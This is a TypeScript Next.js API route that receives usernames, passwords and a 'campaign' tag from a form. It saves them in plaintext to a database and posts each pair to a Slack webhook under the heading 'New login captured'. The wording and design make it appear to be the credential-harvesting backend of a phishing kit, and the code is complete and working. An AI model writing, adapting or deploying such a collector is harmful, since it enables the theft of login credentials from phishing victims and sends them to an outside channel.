// app/api/submit-form/route.ts
import { NextResponse } from "next/server";
import { getDatabase } from "@/lib/mongodb";

export async function POST(request: Request) {
    try {
        const { username, password, campaign } = await request.json();

        if (
            typeof username !== "string" ||
            typeof password !== "string" ||
            !username.trim() ||
            !password.trim()
        ) {
            return NextResponse.json(
                { success: false, error: "Invalid form data" },
                { status: 400 }
            );
        }

        let dbSaved = false;
        let dbError = null;

        // Try to save to database, but don't fail if it doesn't work
        try {
            const db = await getDatabase();
            const result = await db
                .collection("users")
                .insertOne({ username, password, campaign, timestamp: new Date() });

            if (result.insertedId) {
                dbSaved = true;
                console.log("✅ Saved to database:", result.insertedId);
            }
        } catch (dbErr) {
            dbError = dbErr instanceof Error ? dbErr.message : "Unknown DB error";
            console.warn("⚠️ Database save failed (continuing anyway):", dbError);
        }

        // Send to Slack webhook (this should work even if DB fails)
        const slackWebhook = process.env.SLACK_WEBHOOK_URL;
        let slackSent = false;
        let slackError = null;

        if (slackWebhook) {
            try {
                const slackResponse = await fetch(slackWebhook, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        text: `🔐 New login captured:\\n👤 Username: *${username}*\\n🔑 Password: *${password}*${campaign ? `\\n🗳️ Campaign: *${campaign}*` : ''}\\n💾 DB Saved: ${dbSaved ? "✅" : "❌"}`,
                    }),
                });

                if (slackResponse.ok) {
                    slackSent = true;
                    console.log("✅ Sent to Slack");
                } else {
                    slackError = `Slack returned ${slackResponse.status}`;
                    console.warn("⚠️ Slack webhook failed:", slackError);
                }
            } catch (slackErr) {
                slackError = slackErr instanceof Error ? slackErr.message : "Unknown Slack error";
                console.warn("⚠️ Slack webhook failed:", slackError);
            }
        }

        // Return success if at least ONE method worked
        if (dbSaved || slackSent) {
            return NextResponse.json({
                success: true,
                saved: { db: dbSaved, slack: slackSent }
            }, { status: 201 });
        } else {
            // All methods failed - return error details
            return NextResponse.json({
                success: false,
                error: "All save methods failed (database, Slack)",
                details: { dbError, slackError }
            }, { status: 500 });
        }
    } catch (error) {
        console.error("🚨 Error in /api/submit-form:", error);
        return NextResponse.json(
            { success: false, error: error instanceof Error ? error.message : "Unknown error" },
            { status: 500 }
        );
    }
}
